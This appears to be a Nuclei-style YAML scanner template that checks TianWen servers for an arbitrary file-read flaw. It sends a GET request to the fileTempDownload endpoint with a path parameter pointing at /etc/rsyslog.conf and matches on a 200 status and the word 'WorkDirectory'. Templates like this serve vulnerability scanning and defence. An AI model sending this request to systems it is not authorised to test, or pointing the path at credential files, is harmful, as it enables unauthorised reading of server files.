id: TianWen-fileTempDownload-ReadAnyFile

info:
  name: TianWen-fileTempDownload-ReadAnyFile
  author: iSee857
  severity: high
  description: TianWen-fileTempDownload-ReadAnyFile

requests:
  - method: GET
    raw:
      - |
        GET /fileUploadAndDownload/fileTempDownload?path=/etc/rsyslog.conf HTTP/1.1
        Host: {{Host}}
        Accept: */*
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - "WorkDirectory"
        condition: and
      - type: status
        status:
          - 200